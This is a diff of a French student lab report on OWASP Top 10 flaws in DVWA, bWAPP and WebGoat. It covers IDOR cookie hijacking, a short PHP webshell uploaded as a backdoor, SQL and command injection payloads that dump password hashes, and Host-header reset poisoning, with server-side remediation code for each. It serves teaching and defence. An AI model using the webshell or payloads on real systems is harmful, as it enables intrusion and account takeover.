@@ -59,6 +59,135 @@ BELLENGÉ Célian
 
 <br>
 
+# A01 - Broken Access Control
+
+## Présentation
+
+Dans cette section je décris deux tests pratiques d'accès non autorisé trouvés en laboratoire, j'analyse les causes profondes observées et je propose des remédiations techniques et organisationnelles concrètes. Les descriptions incluent des précisions sur les faiblesses observées, les risques associés et des exemples de corrections applicables côté serveur et côté infrastructure.
+
+## Insecure direct object reference (IDOR)
+
+On récupère la requête POST
+<img src="A01 - Broken Access Control\image.png" width=600/>
+
+On send la requête
+<img src="A01 - Broken Access Control\image-1.png" width=600/>
+
+Et dans la réponse on a l'hijack cookie
+<img src="A01 - Broken Access Control\image-2.png" width=600/>
+
+Voici des exemples de cookies obtenus : 
+ - 8452187297587558819-1761924367779
+ - 8452187297587558820-1761924386427
+ - 8452187297587558822-1761924400446
+
+Le cookie ```8452187297587558820-1761924386427``` est séparé en deux partie, l'ID et le timestamp.
+On remarque que lorsqu'on envoie plusieurs fois la requête, la partie ID s'incrémente de 1 mais des fois elle s'incrémente de 2.
+
+Cela veut dire que quelqu'un a envoyé une requête entre nos requêtes. L'objectif va être de récupérer les informations de cette requête. Pour cela, on envoie la requête dans l'intruder, on ajoute le hijack cookie dans la section "Cookie", on place une variable sur la partie id et on cherche un timestamp situé entre le cookie précédent et le cookie suivant.
+
+Pour cela, on envoie la requuête dans l'intruder, on ajoute le hijack cookie dans la section "Cookie", dans la partie id on modifie pour avoir l'ID du cookie qu'on recherche et on cherhce un timestamp entre le cookie précédent et le cookie suivant.
+
+<img src="A01 - Broken Access Control\image-3.png" width=600/>
+
+Avec l'une des requête nous avons le bon résultat :
+<img src="A01 - Broken Access Control\image-4.png" width=600/>
+
+Qui est obtenue grâce à la requête 
+
+<img src="A01 - Broken Access Control\image-5.png" width=600/>
+
+
+### Analyse
+
+L'observation d'un cookie structuré sous la forme `ID-timestamp` et l'incrémentation séquentielle de la composante ID révèlent que le système s'appuie sur des identifiants prévisibles pour lier des sessions ou des ressources. Le fait que l'ID s'incrémente parfois de 2 indique qu'il existe des opérations concurrentes et qu'aucun mécanisme n'empêche l'énumération. Le test d'Intruder qui a permis de retrouver la requête "intercalée" démontre que des informations sensibles peuvent être obtenues simplement en devinant des valeurs adjacentes, ce qui est caractéristique d'une faiblesse d'Insecure Direct Object Reference. L'architecture faute d'obliger une vérification server-side d'ownership laisse la possibilité à un attaquant d'accéder ou d'influencer des ressources qui ne lui appartiennent pas. Le passage en revue des réponses montre également une absence de signatures ou de mécanismes d'intégrité sur le cookie, ce qui rend inutile toute tentative de détection d'altération par le serveur. Enfin, l'absence de limitations de fréquence et de détection d'énumération permet à un attaquant d'automatiser ces essais et d'extraire des sessions ou des ressources par balayage.
+
+### Remédiation
+Pour corriger cette vulnérabilité, il faut remplacer les identifiants séquentiels par des identifiants opaques (UUID v4 ou références indirectes), vérifier systématiquement côté serveur que l'utilisateur authentifié est bien propriétaire de la ressource et retourner un 403 en cas d'ownership invalide. Les cookies/tokens liant session et ressource doivent être signés (HMAC) et marqués HttpOnly/Secure, la durée de session doit être limitée et révoquée lors d'événements sensibles. Il faut centraliser la logique d'autorisation dans un middleware, appliquer du rate limiting et journaliser précisément les accès refusés pour alimenter la détection d'énumération. Intégrer des tests automatisés dans la CI/CD qui tentent de lire/modifier des ressources tierces permet de garantir la régression et d'assurer la persistance des protections.
+
+```php
+<?php
+session_start();
+$secret = getenv('HMAC_SECRET') ?: 'change_in_prod';
+$current = $_SESSION['user_id'] ?? null;
+if (!$current) { http_response_code(401); exit('Unauthorized'); }
+
+// Vérifier signature cookie opaque
+$cookie = $_COOKIE['sess'] ?? '';
+list($opaque,$ts,$sig) = array_pad(explode('|',$cookie),3,'');
+if (!hash_equals(hash_hmac('sha256', "$opaque|$ts", $secret), $sig)) { http_response_code(401); exit('Invalid session'); }
+
+// Vérifier ownership avant modification
+$resourceId = $_POST['resource_id'] ?? null;
+if (!$resourceId) { http_response_code(400); exit('Bad Request'); }
+
+$pdo = new PDO('mysql:host=localhost;dbname=appdb','appuser','apppass',[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);
+$stmt = $pdo->prepare('SELECT owner_id FROM resources WHERE id=:id LIMIT 1');
+$stmt->execute([':id'=>$resourceId]);
+$owner = $stmt->fetchColumn();
+if ($owner === false) { http_response_code(404); exit('Not Found'); }
+if ((string)$owner !== (string)$current && $_SESSION['role'] !== 'admin') { http_response_code(403); error_log("DENIED $current -> $resourceId"); exit('Forbidden'); }
+
+// Modification atomique
+$pdo->beginTransaction();
+$upd = $pdo->prepare('UPDATE resources SET secret=:s, version=version+1 WHERE id=:id');
+$upd->execute([':s'=>$_POST['secret'], ':id'=>$resourceId]);
+$pdo->commit();
+echo 'Modification réussie';
+?>
+
+
+
+## Modification d’un autre utilisateur
+
+Objectif : vérifier si, connecté en tant que Test, on peut modifier le secret d’un autre utilisateur en changeant le paramètre de requête.
+
+Preuve
+- Création utilisateur Test :
+  <img src="A01 - Broken Access Control\bWapp1.png" width=600/>
+
+- Envoi de la requête de modification (param user ou uid) :  
+  <img src="A01 - Broken Access Control\bWapp2.png" width=600/>
+
+- Modification du paramètre pour viser un autre compte et envoi :  
+  <img src="A01 - Broken Access Control\bWapp3.png" width=600/>
+
+- Résultat : secret modifié pour l’autre compte :
+  <img src="A01 - Broken Access Control\bWapp4.png" width=600/>
+
+
+### Analyse
+- L’application accepte un identifiant fourni par le client sans vérifier l’ownership ou les droits.
+- Erreur de conception : contrôles d’accès object-level manquants.
+
+### Remédiation
+1. Toujours vérifier côté serveur que l’utilisateur courant est propriétaire ou a le rôle nécessaire avant lecture/modification.  
+2. Centraliser la logique d’autorisation (middleware / fonction authorize).  
+3. Logguer les accès refusés et envisager IDs non-prévisibles (UUID) en complément.
+
+```php
+session_start();
+$current = $_SESSION['user_id']; // id connecté
+$target = $_POST['user_id'] ?? null;
+
+// récupérer $owner_id depuis la BDD pour la ressource ciblée
+// exemple simplifié : $owner_id = get_owner_id($target);
+if ($owner_id !== $current && $_SESSION['role'] !== 'admin') {
+    http_response_code(403);
+    echo "403 Forbidden";
+    exit;
+}
+// sinon autoriser la modification
+```
+
+En tant que User A, le fait de tenter de modifier la ressource de User B fais que le serveur renvoie 403 et la ressource reste inchangée.
+
+
+## Conclusion
+
+Les problèmes de Broken Access Control identifiés proviennent d'un manque de vérification d'ownership et de l'utilisation d'identifiants prévisibles. La résolution nécessite une remise en place systématique des contrôles côté serveur, l'utilisation d'identifiants opaques, la centralisation de la logique d'autorisation, la protection des cookies et des sessions par signature et flags sécurisés, la journalisation détaillée des accès et la mise en place de tests et d'alertes. En appliquant ces mesures, on réduit significativement le risque d'énumération, de prise de contrôle de session et de modifications non autorisées de ressources appartenant à d'autres utilisateurs.
+
+
 # A02 - Cryptographic Failures
 
 ## Intro
@@ -487,7 +616,7 @@ Dans un premier exemple, nous allons vous montrer comment récupérer une base d
 
 ### 1. Injection SQL
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\SQLInjection.png" width=600/>
+<img src="A03 - Injection\SQLInjection.png" width=600/>
 
 Cette page est classique, elle demande à l'utilisateur un ID et renvoie le ```First name``` et le ```Surname``` de l'identifiant qui correspond à l'ID.
 
@@ -497,7 +626,7 @@ L'objectif est d'obtenir tous les mots de passe. Mais pour commencer simplement,
 
 ```' or 1=1#```
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\SQLInjection1.png" width=600/>
+<img src="A03 - Injection\SQLInjection1.png" width=600/>
 
 Le ```'``` permet de finir le ```id='```. Comme il est vide, ce sera faux, mais on va contourner en ajoutant ```or 1=1``` qui est toujours vrai. Enfin ```#``` va permettre d'ignorer les potentiels restrictions qui suivent.
 
@@ -507,7 +636,7 @@ Nous allons maintenat chercher les mots de passe. Malheureusement, nous ne conna
 
 ```' union select table_name,null from information_schema.tables#```
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\SQLInjection2.png" width=600/>
+<img src="A03 - Injection\SQLInjection2.png" width=600/>
 
 Nous avons à nouveau ```'``` et ```#``` et ils ont les même rôles que précédemment. Cependant, on fait un union avec une autre table, qui existe toujours et qui contient les noms des tables. Il apparait donc les différentes tables. On y remarque notemment la table ```users```. Il faut mettre ```,null``` car la fenêtre est sensée afficher ```First name``` et ```Surname```, donc 2 valeurs. Si on n'en récupérait qu'1, la fenêtre aurait crash.
 
@@ -515,7 +644,7 @@ Nous avons à nouveau ```'``` et ```#``` et ils ont les même rôles que précé
 
 ```' union select column_name,null from information_schema.columns where table_name='users'```
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\SQLInjection3.png" width=600/>
+<img src="A03 - Injection\SQLInjection3.png" width=600/>
 
 De la même manière, on obtient les différentes colonnes qui constituent la table ```users```. On remarque une colonne nommée ```password```. On va donc faire une dernière injection pour trouver les mots de passe.
 
@@ -523,7 +652,7 @@ De la même manière, on obtient les différentes colonnes qui constituent la ta
 
 ```' union select user,password from users#```
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\SQLInjection4.png" width=600/>
+<img src="A03 - Injection\SQLInjection4.png" width=600/>
 
 Nous avons finalement affiché les hashs des mots de passe des tous les utilisateurs. On reconnait l'encryptage MD5, peu sécurisé.
 
@@ -531,7 +660,7 @@ Nous avons finalement affiché les hashs des mots de passe des tous les utilisat
 
 Cette page est classique, elle demande à l'utilisateur une IP puis execute et renvoie le résultat de la commande ```ping```. Ci-dessous nous avons ping l'IP ```127.0.0.1``` car c'est à cette adresse que nous hébergeons le site. Le site se ping lui-même, ce qui renvoie donc un résultat correct.
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\CommandInjection.png" width=600/>
+<img src="A03 - Injection\CommandInjection.png" width=600/>
 
 Notre objectif dans cette situation va être d'éxécuter du code sur la machine qui héberge le serveur, pour au final en prendre le contrôle.
 
@@ -539,12 +668,12 @@ Notre objectif dans cette situation va être d'éxécuter du code sur la machine
 
 On peut supposer que le site a prépapré une commande similaire à ```"ping " + champ``` et qu'il ne vérifie pas le contenu du champs entré par l'utilisateur. On va donc essayer le payload ```127.0.0.1 && dir``` pour voir s'il exécuter la seconde partie.
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\CommandInjection1.png" width=600/>
+<img src="A03 - Injection\CommandInjection1.png" width=600/>
 
 Heureusement le site a prévu de retirer tous les ```&&``` ou ```||```. Réessayons avec ```|``` suivi non pas d'un espace mais de la commande directement. 
 ```127.0.0.1 |dir```
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\CommandInjection2.png" width=600/>
+<img src="A03 - Injection\CommandInjection2.png" width=600/>
 
 On a réussi à exécuter une commande non prévue par le site. On peut continuer à faire ce que l'on veut.
 
@@ -552,7 +681,7 @@ On a réussi à exécuter une commande non prévue par le site. On peut continue
 
 En naviguant dans les dossiers à l'aide de ```cd``` et ```dir```, on arrive à retrouver la base de données des utilisateurs que l'on a fouillé avec l'injection SQL. La commande ici est ```127.0.0.1 |dir ../../database```
 
-<img src="8INF968-Atelier2-OWASP\A03 - Injection\CommandInjection3.png" width=600/>
+<img src="A03 - Injection\CommandInjection3.png" width=600/>
 
 #### c. Mise hors compétition par un compétiteur
 
@@ -634,26 +763,28 @@ if( ( is_numeric( $octet[0] ) )
 ```
 Comme on veut recevoir une ip, et qu'elle a toujours la même forme int.int.int.int, on va essayer de couper au niveau des ```.``` ce qu'on reçoit en morceaux. S'il y a exactement 4 morceaux et qu'ils contiennent tous des entiers, alors seulement on exécute la commande voulue.
 
-# A04 — Insecure Design
+# Insecure Design
 
 ## Présentation
 Une faille d’Insecure Design survient quand une protection n’a pas été pensée dès la conception : la logique métier ou l’architecture laisse des possibilités d’abus (on fait confiance au client, pas au serveur).  
 Ici j’ai testé deux cas en labo : bypass de CAPTCHA (DVWA) et IDOR / modification du secret d’un autre utilisateur (bWAPP).
 
-## Test 1 — Bypass du CAPTCHA (DVWA)
+## Bypass de CAPTCHA
 
-Objectif : vérifier si le changement de mot de passe peut être effectué sans résoudre le captcha.
+L'objectif va être de vérifier si le changement de mot de passe peut être effectué sans résoudre le captcha.
 
-Preuve
+
+### Pratique 
+
 - Requête initiale :  
-  ![Captcha](8INF968-Atelier2-OWASP\A04 - InsecureDesign\Captcha1.png)  
+  <img src="A04 - InsecureDesign\Captcha1.png" width=600/>
   (formulaire + param step=2 et champs mot de passe)
 
 - Requête modifiée via Burp (on force le step et on soumet) :  
-  ![Captcha](8INF968-Atelier2-OWASP\A04 - InsecureDesign\Captcha2.png)
+  <img src="A04 - InsecureDesign\Captcha2.png" width=600/>
 
 - Résultat : mot de passe modifié sans validation du captcha :  
-  ![Captcha](8INF968-Atelier2-OWASP\A04 - InsecureDesign\Captcha3.png)
+  <img src="A04 - InsecureDesign\Captcha3.png" width=600/>
 
 ### Analyse
 - La logique se fie à des paramètres envoyés côté client (step) et/ou n’effectue pas de vérification serveur du token captcha.
@@ -664,9 +795,6 @@ Preuve
 2. Stocker en session un drapeau captcha_verified uniquement après vérification réussie.  
 3. Ajouter un CSRF token sur le formulaire et invalider captcha_verified après usage. Un CSRF token est un jeton unique généré par le serveur et inclus dans les formulaires ou requêtes pour vérifier que l’action provient bien de l’utilisateur légitime, empêchant ainsi les attaques de type Cross-Site Request Forgery (CSRF).
 4. Journaliser et appliquer un rate-limit sur l’endpoint.
-
-### Extrait de code pour remédiation
-Pour remédier à cette faille, il va falloir faire une vérification côté serveur pour valider la résolution du Captcha.
 
 ```php
 // Vérif token captcha côté serveur
@@ -686,58 +814,125 @@ $_SESSION['captcha_verified'] = true;
 
 La correction permet lors de l'envoie de la requête de changement de mot de passe sans token ou avec token invalide d'envoyer une réponse 403 (accès interdit) et de vérifier que l’action ne passe que si captcha_verified en session est présent et valide ainsi que le CSRF soit bon.
 
+## File Upload
+
+L'objectif va être d'upload une backdoor sur le site.
+
+Pour cela nous allons utiliser fichier php et la partie File Upload du site DVWA.
+
+### Pratique
+
+Il faut commencer par créer le fichier avec le code suivant 
+```php
+<?php
+$cmd=$_GET['cmd'];
+system($cmd);
+?>
+```
+Ce code permet d'exécuter une commande entrée en argument du fichier.
+
+Ensuite il faut l'upload sur le site :
+  <img src="A04 - InsecureDesign\image-1.png" width=600/>
+
+Enfin la connexion peut être effectué en accédant au fichier dans l'URL.
+  <img src="A04 - InsecureDesign\image.png" width=600/>
+
+Ici nous avons exécuté la commande ```pwd``` qui permet d'afficher le répertoire courant.
 
 
-## Test 2 — IDOR / modification d’un autre utilisateur (bWAPP)
-
-Objectif : vérifier si, connecté en tant que Test, on peut modifier le secret d’un autre utilisateur en changeant le paramètre de requête.
-
-Preuve
-- Création utilisateur Test :  
-  ![bWapp](8INF968-Atelier2-OWASP\A04 - InsecureDesign\bWapp1.png)
-
-- Envoi de la requête de modification (param user ou uid) :  
-  ![bWapp](8INF968-Atelier2-OWASP\A04 - InsecureDesign\bWapp2.png)
-
-- Modification du paramètre pour viser un autre compte et envoi :  
-  ![bWapp](8INF968-Atelier2-OWASP\A04 - InsecureDesign\bWapp3.png)
-
-- Résultat : secret modifié pour l’autre compte :  
-  ![bWapp](8INF968-Atelier2-OWASP\A04 - InsecureDesign\bWapp4.png)
 
 
 ### Analyse
-- L’application accepte un identifiant fourni par le client sans vérifier l’ownership ou les droits.
-- Erreur de conception : contrôles d’accès object-level manquants.
+
+Dans ce scénario, l’application accepte un fichier envoyé par l’utilisateur et le stocke dans un emplacement directement accessible depuis le navigateur. L’upload d’une webshell PHP a permis d’obtenir une exécution de commandes système, démontrant que la fonctionnalité d’upload n’avait pas été conçue avec les contrôles nécessaires. Le problème provient d’un défaut de conception : l’application se contente d’accepter le fichier sans contrôle fiable côté serveur. Elle se limite à des validations superficielles, souvent réalisées côté client, qui sont facilement contournables par un attaquant. Le serveur ne vérifie pas le type réel du fichier, autorise le stockage de fichiers exécutables dans un répertoire interprété par PHP et conserve le nom fourni par l’utilisateur, ce qui ouvre la voie à des contournements classiques tels que les doubles extensions. L’impact est particulièrement critique puisqu’il permet une prise de contrôle complète du serveur via l’exécution de code arbitraire. L’exemple réalisé dans DVWA illustre que l’absence de validation interne, de gestion sécurisée du stockage, de restriction d’exécution et de contrôle d’accès favorise une compromission totale du système.
 
 ### Remédiation
-1. Toujours vérifier côté serveur que l’utilisateur courant est propriétaire ou a le rôle nécessaire avant lecture/modification.  
-2. Centraliser la logique d’autorisation (middleware / fonction authorize).  
-3. Logguer les accès refusés et envisager IDs non-prévisibles (UUID) en complément.
 
-Extrait PHP
+La correction de ce type de faille exige de ne plus faire confiance aux données envoyées par le client et d’effectuer toutes les vérifications sur le serveur. Le traitement des uploads doit être repensé pour autoriser uniquement les fichiers strictement nécessaires et en vérifier la nature réelle à l’aide d’outils serveur comme `finfo`, plutôt que de se fier aux informations déclarées par le navigateur. Les fichiers doivent être stockés dans un emplacement situé hors du répertoire web, de manière à empêcher toute exécution directe. Le serveur doit renommer chaque fichier avec un identifiant généré automatiquement et appliquer des permissions restreintes afin de supprimer toute possibilité d’exécution. Avant le stockage, il est nécessaire de vérifier que le contenu ne contient pas de code exécutable et, idéalement, de le soumettre à un antivirus. La taille et la nature des fichiers doivent être limitées, et seules les personnes autorisées doivent être en mesure d’effectuer des uploads. Enfin, la fonctionnalité doit être journalisée afin de conserver une trace exploitable en cas d’incident, et faire l’objet de contrôles réguliers pour prévenir les régressions de sécurité.
+
+
+Un code PHP pour portéger le serveur de ce type d'attaque serait le suivant.
 
 ```php
+<?php
 session_start();
-$current = $_SESSION['user_id']; // id connecté
-$target = $_POST['user_id'] ?? null;
 
-// récupérer $owner_id depuis la BDD pour la ressource ciblée
-// exemple simplifié : $owner_id = get_owner_id($target);
-if ($owner_id !== $current && $_SESSION['role'] !== 'admin') {
-    http_response_code(403);
-    echo "403 Forbidden";
-    exit;
+$allowed_ext = ['jpg','jpeg','png','gif','pdf'];
+$upload_dir = '/var/www/uploads_secure/';
+$max_size = 5 * 1024 * 1024;
+
+if (!isset($_FILES['uploaded_file'])) {
+    http_response_code(400);
+    exit('Aucun fichier envoyé');
 }
-// sinon autoriser la modification
-```
 
-En tant que User A, le fait de tenter de modifier la ressource de User B fais que le serveur renvoie 403 et la ressource reste inchangée.
+$file = $_FILES['uploaded_file'];
+if ($file['error'] !== UPLOAD_ERR_OK) {
+    http_response_code(400);
+    exit('Erreur upload');
+}
+if ($file['size'] > $max_size) {
+    http_response_code(413);
+    exit('Fichier trop volumineux');
+}
 
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime = finfo_file($finfo, $file['tmp_name']);
+finfo_close($finfo);
+
+$mime_to_ext = [
+    'image/jpeg' => 'jpg',
+    'image/png' => 'png',
+    'image/gif' => 'gif',
+    'application/pdf' => 'pdf'
+];
+
+if (!isset($mime_to_ext[$mime])) {
+    http_response_code(415);
+    exit('Type de fichier non autorisé');
+}
+$ext = $mime_to_ext[$mime];
+
+$original_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed_ext) || ($original_ext && !in_array($original_ext, $allowed_ext))) {
+    http_response_code(415);
+    exit('Extension non autorisée');
+}
+
+$contents = file_get_contents($file['tmp_name']);
+if (strpos($contents, '<?php') !== false || strpos($contents, '<?=') !== false) {
+    http_response_code(403);
+    exit('Contenu dangereux détecté');
+}
+
+$stored_name = bin2hex(random_bytes(16)) . '.' . $ext;
+$dest = $upload_dir . $stored_name;
+
+if (!move_uploaded_file($file['tmp_name'], $dest)) {
+    http_response_code(500);
+    exit('Échec stockage fichier');
+}
+
+chmod($dest, 0640);
+
+error_log(sprintf("UPLOAD: user=%s ip=%s orig=%s stored=%s size=%d mime=%s",
+    $_SESSION['user_id'] ?? 'anonymous',
+    $_SERVER['REMOTE_ADDR'],
+    $file['name'],
+    $stored_name,
+    $file['size'],
+    $mime
+));
+
+echo 'Upload OK';
+?>
 
 ## Conclusion
-Les deux démonstrations ont la même racine : on fait confiance au client (paramètres / états) au lieu d’imposer toutes les vérifications côté serveur.  
-Les remédiations consistent en valider côté serveur (captcha, ownership), utiliser CSRF tokens, centraliser les checks d’autorisation et journaliser les tentatives.
+
+Les vulnérabilités observées relèvent d’un problème de conception avant même un problème d’implémentation. L’Insecure Design apparaît lorsque les mécanismes de sécurité ne sont pas intégrés dès la phase d’architecture et de réflexion fonctionnelle. Les exemples étudiés démontrent que, même si le code produit fonctionne techniquement, l’absence de réflexion préalable sur la manière dont un attaquant pourrait détourner la logique métier conduit à des failles critiques. Il est essentiel de concevoir les protections au niveau serveur, de ne pas se fier aux données envoyées par le client, et de s’assurer que chaque fonctionnalité, surtout lorsqu’elle est sensible, soit dotée d’un processus robuste d’authentification, de validation, d’autorisation et de contrôle.
+
+Une approche uniquement basée sur des validations superficielles ou visuelles ne protège pas une application. Il est nécessaire de combiner plusieurs mesures complémentaires et cohérentes afin de rendre l’exploitation impossible ou très difficile, même pour un attaquant déterminé. Corriger l’Insecure Design requiert souvent bien plus qu’un simple correctif appliqué au code : cela implique une remise en question de l’architecture, des processus de développement et de la logique métier. Une approche de type “Shift-Left Security”, intégrant la sécurité dès la conception, ainsi que l’utilisation de modèles de menace et de revues d’architecture, constitue un moyen efficace pour éviter que ces failles n’atteignent la production. L’objectif ultime est de concevoir des fonctionnalités intrinsèquement résistantes à l’abus, en anticipant les scénarios d’attaque dès leur conception.
+
 
 
 # A05 — Security Misconfiguration
@@ -1325,33 +1520,33 @@ D'après l’OWASP Top-10 2021, la catégorie "Identification and Authentication
 
 Notre but est de prendre le contrôle du compte de ```tom@webgoat-cloud.org```.
 
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\Reset.png" width=600/>
+<img src="A07 - Identification and Authentication Failures\Reset.png" width=600/>
 
 On va d'abord regarder à quoi ressemble une demande de reset de mot de passe.
 
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\Reset1.png" width=600/>
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\Reset2.png" width=600/>
+<img src="A07 - Identification and Authentication Failures\Reset1.png" width=600/>
+<img src="A07 - Identification and Authentication Failures\Reset2.png" width=600/>
 
 Et le lien est : ```http://127.0.0.1:8080/webGoat/PasswordReset/reset/reset-password/24f694ba-43ae-4229-84ef-13beb3c6471d```.
 
 On va passer par un proxy (nous utilisons Burp Suite) pour modifier la requête avant qu'elle n'arrive au serveur.
 
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\Reset3.png" width=600/>
+<img src="A07 - Identification and Authentication Failures\Reset3.png" width=600/>
 
 Ici nous avons modifié le Host vers notre propre serveur de mail afin que nous recevions son mail à sa place. Voici ce que nous avons reçu :
 
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\ResetReception.png" width=600/>
+<img src="A07 - Identification and Authentication Failures\ResetReception.png" width=600/>
 
 On a reçu l'url de reset de mot de passe de son compte. Après avoir choisi son nouveau mot de passe, nous avons maintenant accès à son compte.
 
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\ResetDone.png" width=600/>
+<img src="A07 - Identification and Authentication Failures\ResetDone.png" width=600/>
 
 
 ### 2. Usurper l'identité de quelqu'un (l'admin)
 
 Ici nous allons nous faire passer pour quelqu'un d'autre. Il est possible de choisir notre cible en se connectant juste après la personne que l'on veut usurper. 
 
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\WeakSessionID.png" width=600/>
+<img src="A07 - Identification and Authentication Failures\WeakSessionID.png" width=600/>
 
 Ici le site nous propose de générer facilement des IDs, mais sur d'autres site, un ID est lié à un compte et si on se connecte avec un certain ID, le site nous considère comme la personne lié à l'ID.
 
@@ -1362,9 +1557,9 @@ Ici on va générer quelques IDs pour essayer de trouver un paterne. On trouve u
 
 Ces valeurs ressemblent à des hashs MD5, essayons de décrypter.
 
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\WeakSessionIDHash1.png" width=400/>
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\WeakSessionIDHash2.png" width=400/>
-<img src="8INF968-Atelier2-OWASP\A07 - Identification and Authentication Failures\WeakSessionIDHash3.png" width=400/>
+<img src="A07 - Identification and Authentication Failures\WeakSessionIDHash1.png" width=400/>
+<img src="A07 - Identification and Authentication Failures\WeakSessionIDHash2.png" width=400/>
+<img src="A07 - Identification and Authentication Failures\WeakSessionIDHash3.png" width=400/>
 
 On remarque qu'il s'agit simplement d'une incrémentation. Donc si on se connecte juste avant ou après l'admin, on peut connaître son ID, puis à l'aide d'un proxy, en utilisant la même méthode que précédemment en modifiant la requête avant qu'elle ne soit vraiment envoyée pour modifier les Cookies. Ainsi le site pense que nous sommes l'admin.
 
